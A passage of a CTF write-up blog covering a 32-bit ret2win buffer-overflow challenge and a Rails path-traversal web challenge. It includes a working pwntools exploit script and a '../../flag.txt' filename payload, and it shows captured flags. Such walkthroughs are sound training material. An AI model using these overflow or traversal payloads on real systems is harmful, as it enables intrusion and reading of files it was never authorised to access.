+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>flag{4f4293237e37d06d733772a087299f17}</strong></div>
+        </div>
+    </div>
+<h2 id="2-additional-information-needed">2. Additional Information Needed</h2>
+<h3 id="description-3">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Author: @Soups71</p>
+<p>Another binary exploit challenge, but this time it&rsquo;s gonna take some more information for me to give you what you want.</p>
+</div>
+        </div>
+    </div>
+<h3 id="solve-walkthrough-3">Solve Walkthrough</h3>
+<ul>
+<li>This is a medium pwn challenge and I solve it after the challenge ended</li>
+<li>Same as <code>Echo</code> challenge before, we&rsquo;ve to ret2win to <code>getFlag</code> function.</li>
+<li>First, let&rsquo;s check the ELF protection.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Arch:       i386-32-little
+</span></span><span class="line"><span class="cl">RELRO:      Partial RELRO
+</span></span><span class="line"><span class="cl">Stack:      No canary found
+</span></span><span class="line"><span class="cl">NX:         NX unknown - GNU_STACK missing
+</span></span><span class="line"><span class="cl">PIE:        No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stack:      Executable
+</span></span><span class="line"><span class="cl">RWX:        Has RWX segments
+</span></span><span class="line"><span class="cl">Stripped:   No</span></span></code></pre></div></div>
+<ul>
+<li>Hmm, this is a <strong>32-bit ELF binary</strong> and <strong>no protection at all</strong>.</li>
+<li>Let&rsquo;s discover all function symbols using Ghidra.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/snyk-ctf_pwn2-01.png"
+        data-srcset="/images/snyk-ctf_pwn2-01.png, /images/snyk-ctf_pwn2-01.png 1.5x, /images/snyk-ctf_pwn2-01.png 2x"
+        data-sizes="auto"
+        alt="/images/snyk-ctf_pwn2-01.png"
+        title="Additional Information Needed-01" width="267" height="259" /></p>
+<ul>
+<li>Here&rsquo;s the decompiled code of <code>main</code> and <code>getFlag</code> function.</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// 0x24 (HEX)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  
+</span></span><span class="line"><span class="cl">  <span class="nf">buffer_init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome to this simple pwn challenge...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;All you have to do is make a call to the `getFlag()` function. That</span><span class="se">\&#39;</span><span class="s">s it!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">local_28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="nf">getFlag</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">,</span><span class="kt">int</span> <span class="n">param_2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined4</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_3c</span> <span class="p">[</span><span class="mi">48</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">local_c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="c1">// We&#39;ve to pass this if statement!.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="n">param_1</span> <span class="o">*</span> <span class="n">param_2</span> <span class="o">==</span> <span class="mh">0x23</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">local_c</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">local_c</span> <span class="o">!=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">fgets</span><span class="p">(</span><span class="n">local_3c</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="n">local_c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="n">local_3c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">fclose</span><span class="p">(</span><span class="n">local_c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Nope!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uVar1</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<ul>
+<li>In the disassembly of <code>getFlag</code> function, we&rsquo;ve to pass if condition with multiply the value of <code>param_1</code> and <code>param_2</code>, so it will be equal to <code>0x23</code> (or 35 in decimal). We can do simple math, for example: <code>param_1</code> = <strong>7</strong> and <code>param_2</code> = <strong>5</strong>, so the output will be <strong>35</strong>.</li>
+<li>Here&rsquo;s my exploit script for this challenge.</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#filename: exploit.py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;INFO:
+</span></span></span><span class="line"><span class="cl"><span class="s2">- The binary is x86 (32 bit) architecture.
+</span></span></span><span class="line"><span class="cl"><span class="s2">- The buffer size is 0x24 (36 Bytes) + 0x4 (4 Bytes) for EBP = 40 Bytes.
+</span></span></span><span class="line"><span class="cl"><span class="s2">- All we&#39;ve to do is just return to `getFlag` function.
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./challenge.elf&#34;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 1. Prepare the payload.</span>
+</span></span><span class="line"><span class="cl"><span class="n">win_addr</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;getFlag&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x24</span> <span class="c1">#----------------&lt; Junk.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mh">0x4</span> <span class="c1">#----------------&lt; Old EBP.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">win_addr</span> <span class="c1">#----------------&lt; Buffer address.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span><span class="o">*</span><span class="mh">0x4</span> <span class="c1">#----------------&lt; Stack alignment.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span> <span class="c1">#----------------&lt; Param 1 = 7.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span> <span class="c1">#----------------&lt; Param 2 = 5.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Payload from p0np0n
+</span></span></span><span class="line"><span class="cl"><span class="s2"># Link: https://www.youtube.com/watch?v=8wn7ue68vmE
+</span></span></span><span class="line"><span class="cl"><span class="s2">payload = b&#34;A&#34;*40
+</span></span></span><span class="line"><span class="cl"><span class="s2">payload += win_addr
+</span></span></span><span class="line"><span class="cl"><span class="s2">payload += p32(0x41)
+</span></span></span><span class="line"><span class="cl"><span class="s2">payload += p32(1) * 1
+</span></span></span><span class="line"><span class="cl"><span class="s2">payload += p32(0x23)
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Because all function args is placed into the stack.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [     5     ] = function arg2 / ebp + 0xc</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [     7     ] = function arg1 / ebp + 0x8</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [ alignment ] = stack alignment / caller function</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [    ret    ] = win_addr / getFlag / ebp + 0x4</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [  old rbp  ] = 0x4</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># [   buffer  ] = 0x24 / ebp - 0x4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2. Send the payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">is_remote</span> <span class="o">=</span> <span class="kc">False</span> <span class="c1"># change to True if you want to run remotely.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">is_remote</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenge.ctf.games&#34;</span><span class="p">,</span> <span class="mi">30300</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div>
+<ul>
+<li>Create a sample <code>flag.txt</code> file in your folder to execute the exploit script locally. If it success, then we can run the exploit script remotely. Just change the <code>is_remote</code> variable to <code>True</code>.</li>
+<li>And we got the flag.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/snyk-ctf_pwn2-02.png"
+        data-srcset="/images/snyk-ctf_pwn2-02.png, /images/snyk-ctf_pwn2-02.png 1.5x, /images/snyk-ctf_pwn2-02.png 2x"
+        data-sizes="auto"
+        alt="/images/snyk-ctf_pwn2-02.png"
+        title="Additional Information Needed-02" width="943" height="579" /></p>
+<h3 id="flag-3">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>flag{8e9e2e4ec228db4207791e0a534716c3}</strong></div>
+        </div>
+    </div>
+<hr>
+<h1 id="web">Web</h1>
+<h2 id="timeoff">Timeoff</h2>
+<h3 id="description-4">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Author: @HuskyHacks</p>
+<p>TimeOff is an early build for our upcoming line of business application that will help us manage our employee&rsquo;s PTO requests. Please give it a thorough security test and let us know if you find anything. To set you up for success, our devs have given you the full source code and a development build of the current app. Feel free to build a local instance for your security test. If you find anything exploitable, prove it by capturing the flag.txt file on the live instance!</p>
+<p>The challenge source code is available in the challenge.zip folder. The password is <code>snyk-ftf-2025</code>. Use the Dockerfile to run a local instance of the challenge! To build and the container, unzip the contents of the challenge.zip file and run: <code>docker build -t [challenge_name] . &amp;&amp; docker run -it -p 3000:3000 [challenge_name]</code></p>
+<p>Credentials:</p>
+<ul>
+<li><code>admin@example.com:admin123</code></li>
+<li><code>user@example.com:user123</code></li>
+</ul>
+</div>
+        </div>
+    </div>
+<h3 id="solve-walkthrough-4">Solve Walkthrough</h3>
+<ul>
+<li>This is an easy web challenge and I solve it after the challenge ended.</li>
+<li>Execute below command to run the challenge locally.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker build -t timeoff:latest . <span class="o">&amp;&amp;</span> docker run -d --name <span class="s2">&#34;timeoff_challenge&#34;</span> -p 3000:3000 timeoff:latest</span></span></code></pre></div></div>
+<ul>
+<li>After the challenge is up, first thing to do is login using given credentials from the challenge. I try to login directly as an <code>admin</code>.</li>
+<li>Too many option there after we logged in, but when I try to upload sample <code>flag.txt</code> file, the download file feature is available.</li>
+<li>When I download the file that I just uploaded, I just think that maybe the vulnerability is happen in <code>name</code> of the uploaded file. No sanitize on the input, so I can do like <code>../</code> attack to read the arbitrary file inside the target machine (in this case is to read the <code>flag.txt</code> file).</li>
+<li>Move on to the next step. We need to intercept after submit a new timeoff request. I try to upload sample <code>flag.txt</code> file.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/snyk-ctf_web1-01.png"
+        data-srcset="/images/snyk-ctf_web1-01.png, /images/snyk-ctf_web1-01.png 1.5x, /images/snyk-ctf_web1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/snyk-ctf_web1-01.png"
+        title="Timeoff-01" width="1003" height="624" /></p>
+<ul>
+<li>As you can see, the filename of uploaded file is changed to <code>../../flag.txt</code>. If we try to download the file, then we got the real flag from container.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/snyk-ctf_web1-02.png"
+        data-srcset="/images/snyk-ctf_web1-02.png, /images/snyk-ctf_web1-02.png 1.5x, /images/snyk-ctf_web1-02.png 2x"
+        data-sizes="auto"
+        alt="/images/snyk-ctf_web1-02.png"
+        title="Timeoff-02" width="841" height="407" /></p>
+<ul>
+<li>Now, we can perform this <strong>Path Traversal attack</strong> on the remote target machine.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/snyk-ctf_web1-03.png"
+        data-srcset="/images/snyk-ctf_web1-03.png, /images/snyk-ctf_web1-03.png 1.5x, /images/snyk-ctf_web1-03.png 2x"
+        data-sizes="auto"
+        alt="/images/snyk-ctf_web1-03.png"
+        title="Timeoff-03" width="1181" height="601" /></p>
+<ul>
+<li>After we submit new timeoff request, we can download the real flag in the browser.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/snyk-ctf_web1-04.png"
+        data-srcset="/images/snyk-ctf_web1-04.png, /images/snyk-ctf_web1-04.png 1.5x, /images/snyk-ctf_web1-04.png 2x"
+        data-sizes="auto"
+        alt="/images/snyk-ctf_web1-04.png"
+        title="Timeoff-04" width="830" height="400" /></p>
+<ul>
+<li>You can also try to scan the source code with <code>snyk</code> CLI as the hint says. Here&rsquo;s the output after we scan the given source code.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">snyk code <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">--------------
+</span></span><span class="line"><span class="cl"><span class="c1"># Output:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ... output omitted ...</span>
+</span></span><span class="line"><span class="cl"> ✗ <span class="o">[</span>High<span class="o">]</span> Path Traversal 
+</span></span><span class="line"><span class="cl">   Path: app/app/controllers/files_controller.rb, line <span class="m">6</span> 
+</span></span><span class="line"><span class="cl">   Info: Unsanitized input from <span class="s2">&#34;an HTTP parameter&#34;</span> flows into <span class="s2">&#34;File.read&#34;</span>, where it is used as a path. This may result in a Path Traversal vulnerability and allow an attacker to access arbitrary files.
+</span></span><span class="line"><span class="cl"><span class="c1"># ... output omitted ...</span></span></span></code></pre></div></div>
+<h3 id="flag-4">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>flag{52948d88ee74b9bdab130c35c88bd406}</strong></div>
+        </div>
+    </div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-10-29</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">Ctf</a>,&nbsp;<a href="/tags/international/">International</a>,&nbsp;<a href="/tags/web-exploit/">Web Exploit</a>,&nbsp;<a href="/tags/reverse/">Reverse</a>,&nbsp;<a href="/tags/pwn/">Pwn</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2025/10/pdf-kmipn-vii-ctf-finals-writeup/" class="prev" rel="prev" title="(PDF) KMIPN VII CTF Finals Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>(PDF) KMIPN VII CTF Finals Writeup</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2025</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js"></script></body>
+</html>
